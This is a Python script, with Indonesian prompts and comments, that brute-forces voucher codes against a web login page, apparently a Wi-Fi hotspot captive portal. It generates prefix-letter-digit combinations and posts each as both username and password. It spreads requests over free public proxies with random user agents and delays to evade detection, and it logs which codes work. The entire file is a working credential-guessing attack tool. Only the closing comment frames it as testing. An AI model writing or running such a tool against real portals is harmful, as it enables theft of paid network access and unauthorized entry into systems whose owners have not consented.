import requests
import random
import string
import threading
import sys
import os
import time
import itertools
from queue import Queue
from concurrent.futures import ThreadPoolExecutor

from user_agents import generate_user_agent
from banner import print_banner

# Konfigurasi dasar
TARGET_URL = ""
TIMEOUT = 5
MAX_THREADS = 10

# Global resources
tried_vouchers = set()
lock = threading.Lock()
working_proxies = []
voucher_queue = Queue()
stop_event = threading.Event()

def safe_input(prompt):
    try:
        return input(prompt)
    except KeyboardInterrupt:
        print("\n[!] Dihentikan manual.")
        sys.exit(0)

def get_target_url():
    config_file = "config.txt"
    if os.path.exists(config_file):
        with open(config_file, "r") as f:
            saved_url = f.read().strip()
        if saved_url:
            print(f"[~] URL tersimpan: {saved_url}")
            use_saved = safe_input("Gunakan URL ini? (y/n): ").strip().lower()
            if use_saved == "y":
                return saved_url
            else:
                print("[~] Ganti target URL baru.")
    while True:
        url = safe_input("Masukkan TARGET_URL (contoh http://192.10.10.1/login): ").strip()
        if url.startswith("http"):
            break
        print("URL harus diawali http:// atau https://")
    with open(config_file, "w") as f:
        f.write(url)
    print(f"[~] TARGET_URL disimpan di {config_file}")
    return url

def get_proxies():
    print("[~] Mengambil proxy ...")
    url = "https://www.proxy-list.download/api/v1/get?type=http"
    response = requests.get(url)
    proxies = []
    if response.status_code == 200:
        proxy_list = response.text.strip().split("\r\n")
        for proxy in proxy_list:
            proxies.append({
                "http": f"http://{proxy}",
                "https": f"http://{proxy}",
            })
    else:
        print("Gagal ambil proxy.")
    return proxies

def generate_voucher_mirror(prefix, letters_len=2, digits_len=2):
    letters = string.ascii_lowercase
    for letter_pair in itertools.product(letters, repeat=letters_len):
        letter_str = ''.join(letter_pair)
        reverse_str = letter_str[::-1]

        pairs = [letter_str]
        if reverse_str != letter_str:
            pairs.append(reverse_str)

        for pair in pairs:
            for num in range(1, 100):
                num_str = str(num).zfill(digits_len)
                yield f"{prefix}{pair}{num_str}"

def load_tried_vouchers():
    for fname in ["success.log", "failed.log"]:
        if os.path.exists(fname):
            with open(fname, "r") as f:
                for line in f:
                    tried_vouchers.add(line.strip())

def load_mirror(prefix, letters_len=2, digits_len=2):
    print("[~] Generating kombinasi mirror ...")
    count = 0
    for v in generate_voucher_mirror(prefix, letters_len, digits_len):
        if stop_event.is_set():
            break
        if v not in tried_vouchers:
            voucher_queue.put(v)
            count += 1
    print(f"[~] Total voucher kombinasi baru: {count}")
    print("[!] Semua voucher selesai digenerate.")

def worker_mirror(use_proxy, proxy=None):
    global working_proxies
    session = requests.Session()

    while not stop_event.is_set():
        voucher = voucher_queue.get()  # Blocking GET
        if voucher is None:
            break

        with lock:
            tried_vouchers.add(voucher)

        if stop_event.is_set():
            break

        payload = {
            "username": voucher,
            "password": voucher,
            "dst": "",
            "popup": "true"
        }
        headers = {"User-Agent": generate_user_agent()}

        try:
            r = session.post(
                TARGET_URL,
                data=payload,
                headers=headers,
                proxies=proxy if use_proxy else None,
                timeout=TIMEOUT
            )

            if "status" in r.text.lower() or "logout" in r.text.lower():
                print(f"[+] SUCCESS: {voucher}")
                with open("success.log", "a") as f:
                    f.write(voucher + "\n")
                stop_event.set()
                break
            else:
                print(f"[-] Failed: {voucher}")
                with open("failed.log", "a") as f:
                    f.write(voucher + "\n")

        except Exception as e:
            print(f"[!] Proxy error {proxy} | {e}")
            if use_proxy:
                with lock:
                    if proxy in working_proxies:
                        working_proxies.remove(proxy)
                    if not working_proxies:
                        print("[!] Semua proxy mati.")
                        stop_event.set()
                        break
                if working_proxies:
                    proxy = random.choice(working_proxies)

        time.sleep(random.uniform(0.5, 2.0))

def main():
    print_banner()
    global TARGET_URL
    TARGET_URL = get_target_url()

    print("=== Voucher Brute Force Mirror ===")
    prefix = safe_input("Prefix fix (contoh 12): ").strip()
    letters_len = 2
    digits_len = 2

    use_proxy = safe_input("Gunakan proxy? (y/n): ").strip().lower() == "y"

    load_tried_vouchers()

    global working_proxies
    if use_proxy:
        working_proxies = get_proxies()
        if not working_proxies:
            print("Tidak ada proxy aktif.")
            sys.exit(1)
    else:
        working_proxies = []

    print(f"[~] Mulai brute mirror {prefix}aa01 sampai {prefix}zz99 ... Tekan Ctrl+C untuk berhenti.\n")

    generator_thread = threading.Thread(
        target=load_mirror,
        args=(prefix, letters_len, digits_len)
    )
    generator_thread.start()

    try:
        with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
            for i in range(MAX_THREADS):
                proxy = working_proxies[i % len(working_proxies)] if use_proxy else None
                executor.submit(worker_mirror, use_proxy, proxy)

        generator_thread.join()

        for _ in range(MAX_THREADS):
            voucher_queue.put(None)

    except KeyboardInterrupt:
        print("\n[!] Dihentikan manual.")
        stop_event.set()
        generator_thread.join()

if __name__ == "__main__":
    main()
# This code is a brute force script for testing voucher codes against a specified target URL.
# It includes features for proxy support, multithreading, and voucher generation.